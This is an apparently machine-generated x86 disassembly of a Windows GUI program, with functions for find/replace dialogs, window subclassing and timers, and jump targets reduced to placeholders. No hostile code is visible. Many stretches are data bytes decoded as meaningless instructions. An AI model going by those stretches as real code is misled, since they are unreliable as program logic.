pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x14 ]
mov [ ebx + 0x7c ] eax
mov eax [ esi + 0x18 ]
mov [ ebx + 0x80 ] eax
mov eax [ esi + 0x2c ]
mov [ ebx + 0x6c ] eax
mov eax [ esi + 0x30 ]
mov [ ebx + 0x70 ] eax
mov eax [ esi + 0x34 ]
mov [ ebx + 0x74 ] eax
mov eax [ esi + 0x38 ]
mov [ ebx + 0x78 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call GlobalFree
push eax
call GlobalFree
sub_429c7c
enter 0x429c 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x9d
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x67ffbd63 ] dl
popfd
inc edx
add [ eax ] dl
add al [ eax ]
add [ eax + 0x3b ] cl
inc ebx
add [ eax + esi * 4 + 0x34d00041 ] dh
inc eax
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah ah
mov edx 0x322c0043
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + ebx * 4 - 0x15bfffbd ] bh
inc ebx
add [ edx + esi * 4 + 0x476c0043 ] ch
inc ecx
add [ eax + 0x7c004398 ] al
insb
inc ebx
add [ eax - 0x61 ] ah
inc ebx
add [ ebp + esi * 2 - 0x4f33ffbd ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + 0x5400439c ] bl
in eax 0x43
add [ eax - 0x16 ] dh
inc ebx
add [ ecx + ebp * 8 + 0x6af00043 ] bh
inc ebx
add [ eax ] dl
inc ebx
add [ eax ] dh
inc ebx
add [ ebp + ebx * 8 + 0x43 ] cl
add [ eax ] bh
push 0x43
add [ edx + ebp * 2 ] bh
inc ebx
add [ eax - 0x66 ] dl
inc ebx
add [ edx + ebx * 4 + 0x43 ] bh
add [ ebp + esi * 2 + 0x43 ] bh
add [ ebx + ebp * 2 + 0x77080043 ] dh
inc ebx
add [ eax - 0x6bffbc8a ] al
jns r-xdata
inc ebx
add [ eax + 0x500043df ] al
mov ebp 0xf1100043
inc ebx
add ah bh
fild [ ebx ]
in al dx
fiadd [ ebx ]
add [ eax ] eax
and [ eax + sub_429e38 ] esi
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
mov al 0x9d
inc edx
add [ edi ] al
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0x9cc8776f
inc edx
add ah bh
inc ebx
add [ ebx ] cl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_43adf8
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
add [ eax + 0x78 ] al
inc ebx
add ah bh
popfd
inc edx
add al al
0xdda00043 0x43
pop esp
fiadd [ ebx ]
pop eax
fld [ ebx ]
inc eax
fiadd [ ebx ]
fcomp [ edi - 0x5993ffbd ]
inc ebx
add [ esp + esi * 4 ] cl
inc ebx
add al bl
popfd
inc edx
add ah dh
mov al 0x43
add [ edi + ebp * 4 ] ah
inc ebx
add [ esp + esi * 4 - 0x4b57ffbd ] ah
inc ebx
add [ eax - 0x4d ] ah
inc ebx
add [ eax ] cl
mov bl 0x43
sub_429dfc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43b980
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_429e40
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_429e7c
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458048
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_429e40
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45806c
jmp r-xdata
push ebp
call sub_429e40
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458048
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458048
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45806c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_45806c
jmp r-xdata
sub_429f30
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_428310
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_42a1f0
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_42a258
push eax
mov eax esi
call sub_42a1f0
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_42a258
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_429e7c
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_429fb8
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_428378
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_429f30
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42a062
add [ eax ] al
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40d19c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4283c0
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_42a0b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_43468c
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_42a0f4
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_429f30
xor ecx ecx
mov dl 0x1
mov eax [ sub_429c7c ]
call sub_439c98
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_42a0b8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_43df6c
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_42a208
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_42a270
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4283f4
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_403490
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_403490
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_43df6c
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_42a368
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404510
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_408698
pop esi
pop ebx
retn
sub_42a38c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404510
mov edx eax
lea eax [ ebx + 0x1ac ]
mov ecx 0xff
call sub_408698
pop esi
pop ebx
retn
sub_42a3b0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_429fb8
mov eax ReplaceTextA
mov [ esi + 0x64 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_42a494
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408c90
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_42a52f
add [ edi ] cl
add [ eax ] al
add [ eax + ecx * 4 - 0x685fffb9 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x64004788 ] dh
fwait
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 - 0x68a3ffb9 ] ch
push eax
jb r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x27ffb878 ] bl
cdq
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 - 0x64e7ffb9 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004788 ] dl
0x47 0x0
mov [ eax - 0x621fffb9 ] cs
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x78 ] bl
inc edi
add [ eax ] bl
cwde
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 + 0x47 ] dl
add ah dh
pushfd
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x78 ] dl
inc edi
add [ eax - 0x63 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 + 0x47 ] cl
add [ eax - 0x66 ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42a63a
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
arpl [ eax + 0x74 ] dx
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a641
retn
cmp [ rw-data ] 0x0
je r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x14004788 ] ch
popfd
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 - 0x6477ffb9 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x17ffb878 ] ah
0x47 0x0
pushfd
mov [ edi ] al
je r-xdata
lodsb [ esi ]
mov [ edi ] al
pop esp
xchg edi eax
cmp [ cs : eax + 0x25 ] bl
cmp [ cs : eax ] bl
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404acc
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42a644
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403da0
call sub_42a494
mov eax [ r-xdata ]
call sub_4139ac
mov eax [ r-xdata ]
call sub_413a4c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4139f8
sub_42a688
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0xa7
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsd [ esi ] [ edi ]
inc edx
add [ eax ] cl
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + eax ] al
add [ eax ] cl
sub al [ ecx ]
mov ah 0xb0
inc ecx
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al ch
cmpsd [ esi ] [ edi ]
inc edx
add [ eax + 0x48 ] dl
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 - 0x539fffbf ] dl
inc ecx
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add [ eax + 0x10042a7 ] bl
add bh ch
[ eax - 0x57 ]
inc edx
add [ esi ] al
push esp
push esp
imul ebp [ ebp + 0x65 ] 0xa7149072
inc edx
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x42a6d072
add [ ebx + ebp ] al
inc ecx
add [ 0x78450800 ] al
je r-xdata
dec ecx
outsb
je r-xdata
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
pop esi
pop ebx
retn
jb r-xdata
insb
jae r-xdata
call sub_403608
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42a894
mov eax [ esi + 0x34 ]
call sub_41bb44
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a990
test bl bl
jle r-xdata
popad
insb
adc eax 0x380041
add bh bh
inc eax
test eax 0x10042
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
pop es
dec edi
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x84565372
shl [ eax + ecx - 0x7d ] cl
je r-xdata
inc eax
add [ eax ] al
add bh bh
and [ ecx + 0x10042 ] ch
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add bh bh
xor [ ecx + 0x10042 ] ch
add [ eax ] al
add [ eax ] al
add [ eax + 0x3e8 ] al
add eax [ eax ]
or [ ecx + 0x6e ] cl
add [ eax ] al
adc [ eax ] al
inc eax
add [ eax ] al
jmp [ eax ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_42a7e8
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_42a894
mov eax [ esi + 0x34 ]
call sub_41bb44
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a990
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_42a820
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42a85a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a894
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_42a913
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a91a
lea eax [ ebp - 0x4 ]
call sub_404050
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
sub_42a96c
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] ah
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] ch
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] dl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] bl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] al
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + 0x47 ] ah
add al dh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ edx + ecx * 4 ] ch
inc edi
add ah bl
stosb [ edi ]
inc edx
add [ edx + ecx * 4 ] ah
inc edi
add ah dl
stosb [ edi ]
inc edx
add [ edx + ecx * 4 ] bl
inc edi
add ah cl
stosb [ edi ]
inc edx
add [ edx + ecx * 4 ] dl
inc edi
add ah al
stosb [ edi ]
inc edx
add [ edx + ecx * 4 ] cl
inc edi
add [ edx + ebp * 4 - 0x75fbffbe ] bh
inc edi
add [ edx + ebp * 4 - 0x7603ffbe ] dh
inc edi
add [ edx + ebp * 4 - 0x760bffbe ] ch
inc edi
add [ edx + ebp * 4 - 0x7613ffbe ] ah
inc edi
add [ edx + ebp * 4 - 0x761bffbe ] bl
inc edi
add [ edx + ebp * 4 - 0x7623ffbe ] dl
inc edi
add [ edx + ebp * 4 - 0x762bffbe ] cl
inc edi
add [ edx + ebp * 4 - 0x7633ffbe ] al
inc edi
add [ edx + ebp * 4 + 0x42 ] bh
add ah al
mov [ edi ] eax
je r-xdata
adc al 0x8a
inc edx
add [ ecx + ecx * 4 - 0x5593ffb9 ] bh
inc edx
add [ ecx + ecx * 4 - 0x559bffb9 ] dh
inc edx
add [ ecx + ecx * 4 - 0x55a3ffb9 ] ch
inc edx
add [ ecx + ecx * 4 - 0x55abffb9 ] ah
inc edx
add [ ecx + ecx * 4 - 0x55b3ffb9 ] bl
inc edx
add [ ecx + ecx * 4 - 0x55bbffb9 ] dl
inc edx
add [ ecx + ecx * 4 - 0x55c3ffb9 ] cl
inc edx
add [ ecx + ecx * 4 - 0x55cbffb9 ] al
inc edx
add [ ecx + ecx * 4 + 0x47 ] bh
add [ edx + ebp * 4 ] ch
inc edx
add [ ecx + ecx * 4 + 0x47 ] dh
add [ edx + ebp * 4 ] ah
inc edx
add [ ecx + ecx * 4 + 0x47 ] ch
add [ edx + ebp * 4 ] bl
inc edx
add [ ecx + ecx * 4 + 0x47 ] ah
add [ edx + ebp * 4 ] dl
inc edx
add [ ecx + ecx * 4 + 0x47 ] bl
add [ edx + ebp * 4 ] cl
inc edx
add [ ecx + ecx * 4 + 0x47 ] dl
add [ edx + ebp * 4 ] al
inc edx
add [ ecx + ecx * 4 + 0x47 ] cl
add ah bh
test eax 0x89440042
inc edi
add ah dh
test eax 0x893c0042
inc edi
add ah ch
test eax 0x89340042
inc edi
add ah ah
test eax 0x892c0042
inc edi
add ah bl
test eax 0x89240042
inc edi
add ah dl
test eax 0x891c0042
inc edi
add ah cl
test eax 0x89140042
inc edi
add ah al
test eax 0x890c0042
inc edi
add [ ecx + ebp * 4 - 0x76fbffbe ] bh
inc edi
add [ ecx + ebp * 4 - 0x7703ffbe ] dh
inc edi
add [ ecx + ebp * 4 - 0x770bffbe ] ch
inc edi
add [ ecx + ebp * 4 - 0x7713ffbe ] ah
inc edi
add [ ecx + ebp * 4 - 0x771bffbe ] bl
inc edi
add [ ecx + ebp * 4 - 0x7723ffbe ] dl
inc edi
add [ ecx + ebp * 4 - 0x772bffbe ] cl
inc edi
add [ ecx + ebp * 4 - 0x7733ffbe ] al
inc edi
add [ ecx + ebp * 4 + 0x42 ] bh
add ah al
mov [ edi ] al
je r-xdata
add [ ecx + ecx * 4 ] dl
inc edx
add [ eax + ecx * 4 - 0x5693ffb9 ] bh
inc edx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ac9c
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aca3
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404acc
sub_42acd8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42acfd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad04
retn
sub_42ad10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ad41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ad48
retn
mov eax [ rw-data ]
call sub_403294
sub_42adf8
or al [ eax ]
add [ eax ] al
pop eax
mov al [ edi ]
xor al 0x9a
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 4 + 0x47 ] dl
add [ eax + ebx * 4 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x76 ] dl
inc edi
add [ edi + edx * 4 + 0x47 ] dl
add [ eax ] al
dec esp
mov al [ edi ]
sbb al 0x99
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x76 ] cl
inc edi
add [ edx + ebx * 4 + 0x47 ] al
add [ eax ] al
inc esp
mov al [ edi ]
fcomp [ ebp + 0x47 ]
add [ eax ] al
inc eax
mov al [ edi ]
rcr [ edx + 0x47 ] 0x1
add [ eax ] al
cmp al 0x8a
inc edi
add [ ebx + ebx * 4 + 0x47 ] ch
add [ eax ] al
cmp [ edx - 0x626bffb9 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 4 ] dh
inc edi
add ah al
xchg edi eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42aea0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42aea7
retn
call sub_42addc
sub_42aed4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42aef9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42af00
